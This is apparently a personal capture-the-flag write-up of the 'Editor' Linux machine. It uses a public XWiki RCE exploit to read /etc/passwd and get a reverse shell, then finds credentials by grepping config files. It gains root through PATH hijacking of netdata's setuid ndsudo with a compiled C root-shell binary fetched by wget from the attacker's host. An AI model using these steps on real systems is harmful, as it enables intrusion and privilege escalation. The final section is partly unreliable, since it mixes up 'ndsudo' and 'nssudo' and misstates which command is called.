# Editor Season 8 Linux Machine 

So far after addind the domain name, in the web page there is much not to go with, other then sending and email to **contact** or downloading the text editor, but web browser stops. 
I will probaly come back to this. 

I will scan for vhosts or other directories. 
Ferox did not give me anything. Will try Ffuf just because. 
Nothing 

Will try to scan for vhots and found **wiki**. 

I searched for exploits and found, https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py. Did not seem to work. 

Found a login page in **wiki.editor.htb**, will see if this can be exploited.

Tried a manual SQLi, `' or 1=1-- - '` and also tried it with HTTP verp tampering. No luck 

Scanned the ip with the nmap and then gave me **8080**, was able to then find this as well, http://editor.htb:8080/robots.txt.

Within the nmap scan we can also see that there is a Jetty version, `8080/tcp open  http    Jetty 10.0.20`
Googling this version shows that there is exploits. This did not give me much, though I did try so file path traversal but nothing. 

Going back to this https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py and reading the code more carefully I realized that the input was I was giving it was all wrong. 
Once I corrected that, I was able to get **/etc/passwd**.

Found in the /etc/passwd:
Oliver 
MySQL

# Reverse Shell

I was not getting a revere shell from the repo, even though I tried to configure the code 4-5 times. Did not want to sit there and learn Groovy syntax to possibly modify the code better so I looked for other repos.

Following this RCE from repo, https://github.com/gunzf0x/CVE-2025-24893. I was able to get a revershell on the target.

Once I found **oliver** but got permission denied. 
Spent time trying to figure this out but going back to "keeping it simple", I decided to look for configure files that will have a password:
`find /etc ~/.config -type f -exec grep -i "password" {} + 2>/dev/null` with this command I was able to find the password for **oliver**.

Once in I got the user.txt

# Root

While I was previously trying to get user, I saw a lot of **netdata** information, and also saw that **oliver** was in that group. I kept some information from it.

`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h` allows to use whitelisted commands:
```
The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

```

After that I tried:
```
mkdir -p /tmp/mybin
echo -e '#!/bin/bash\nid\n/bin/bash -p' > /tmp/mybin/nvme
chmod +x /tmp/mybin/nvme

```
then ran to get root:
`PATH=/tmp/mybin:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list` but did not work. Tried for the other commands as well.

Found ports using `netstat -tulpn` but dont know much on what to with it.

Trying to connect to one of the **MySQL** ports. Need password, wall.

Going back to **ndsudo**, I decided to go with a **.c** file instead:

**for the setuid, that may relate to bash protect mechanism**
I kept this in mind and came up with this:

### 🔧 Step 1: Crafting a malicious binary to escalate privileges

I created a C program (`nvme.c`) with the following contents:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

This code is simple: it sets the **UID and GID to 0 (root)** and then spawns a root shell.


### 📦 Step 2: Compiling the payload on my local machine

Since the target didn’t have `gcc` installed and I had no `sudo` rights, I compiled the binary **on my own machine** like this:

```bash
gcc nvme.c -o nvme
```


### 🌐 Step 3: Transferring the binary to the target

I hosted the binary using Python’s built-in HTTP server:

```bash
python3 -m http.server
```

Then, on the target machine, I downloaded it:

```bash
wget http://<MY_IP>:8000/nvme
```


### 🗂️ Step 4: Setting up a fake `nvme` in a writable path

I knew that `/opt/netdata/usr/libexec/netdata/plugins.d/nssudo` executes `nvme-list`, expecting it to be a real binary.

But I suspected that it **didn’t use full paths**, and instead **trusted the `PATH` variable**. That meant I could trick it into running my binary if I put a fake `nvme-list` earlier in the `PATH`.

So I did this:

```bash
mkdir -p /tmp/mybin
chmod 700 /tmp/mybin
mv ./nvme /tmp/mybin/nvme
chmod +x /tmp/mybin/nvme
```

Note: Even though I named it `nvme`, it would be executed as `nvme-list` — but `nssudo` only calls `nvme-list`, and it was enough for the system to just find `nvme` in `$PATH`.


### 💣 Step 5: Exploiting `nssudo` with PATH hijacking

I ran:

```bash
PATH=/tmp/mybin:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/nssudo nvme-list
```

What happened here:

* I **manipulated the PATH** so that `/tmp/mybin` is searched first.
* The `nssudo` binary has the **setuid bit** and is run as **root**.
* When `nssudo` calls `nvme-list`, it unknowingly calls **my backdoored `nvme`** from `/tmp/mybin`.
* My binary executes with **root privileges**, drops me into a **root shell**.


### 🧠 Why this worked:

* `nssudo` is a **setuid-root binary** that calls another binary (`nvme-list`) based on `PATH`.
* I abused **PATH hijacking** by placing my malicious binary early in `PATH`.
* I included `setuid(0)` and `setgid(0)` in my binary to **inherit root privileges** when executed.
* Since nssudo executed my binary as root, I gained a root shell.


